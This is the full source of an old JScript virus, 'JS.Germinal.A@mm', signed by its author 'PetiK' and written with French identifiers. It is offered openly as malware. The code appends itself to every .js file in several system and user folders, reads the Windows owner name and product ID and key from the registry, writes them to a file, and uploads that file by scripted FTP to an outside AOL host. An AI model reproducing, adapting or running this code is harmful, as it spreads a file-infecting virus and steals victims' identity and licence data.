// JS.Germinal.A@mm
var WS=WScript.CreateObject("WScript.Shell")
var fso=WScript.CreateObject("Scripting.FileSystemObject")
var win=fso.GetSpecialFolder(0)
var c=fso.OpenTextFile(WScript.ScriptFullName,1)
var virus=c.ReadAll()


var dossier=new Array()
dossier[0]=fso.GetFolder(".")
dossier[1]=win
dossier[2]=win + "\\Desktop"
dossier[3]=win + "\\SAMPLES\\WSH"
for(i=0;i<4;i++){
   infecte(dossier[i])
		}
function infecte(dossier) {
   var notredossier=fso.GetFolder(dossier)
   var fichier=new Enumerator(notredossier.Files)
      if(fso.GetExtensionName(fichier.item()).toUpperCase()=="JS") {
         var victime=fso.OpenTextFile(fichier.item().path,1)
         var marque=victime.Read(19)
         var victimecode=marque+victime.ReadAll()
         victime.Close()
         if(marque!="// JS.Germinal.A@mm") {
            var victime=fso.CreateTextFile(fichier.item().path,2)
            victime.Write(virus+victimecode)
            victime.Close()
         }
      }
}


WS.RegWrite ("HKLM\\Software\\","JS.Germinal Par PetiK 02/05/2001");
WS.RegWrite ("HKCU\\Software\\","JS.Germinal Par PetiK 02/05/2001");

var nom=WS.RegRead ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner")
var org=WS.RegRead ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOrganization")
var id=WS.RegRead ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductId")
var key=WS.RegRead ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductKey")
var ver=WS.RegRead ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Version")
var vernum=WS.RegRead ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\VersionNumber")

var txt=fso.CreateTextFile("C:\\"+nom+".txt",2)
txt.WriteLine ("Information de " + nom + " à " + org);
txt.WriteLine ("");
txt.WriteLine ("Numéro d'identification : " + id);
txt.WriteLine ("Numéro de la clé : " + key);
txt.WriteLine ("Version de windows : " + ver + " " + vernum);
txt.Close()

var drv=fso.CreateTextFile(win+"\\PetiK.drv",2)
drv.WriteLine ("open");
drv.WriteLine ("members.aol.com");
drv.WriteLine ("pentasm99");
drv.WriteLine ("ascii")
drv.WriteLine ("put C:\\"+nom+".txt");
drv.WriteLine ("bye");
drv.WriteLine ("exit");
drv.Close()

WS.Run ("command.com /c ftp.exe -i -v -s:"+win+"\\PetiK.drv")

// Par PetiK 2nd June 2001
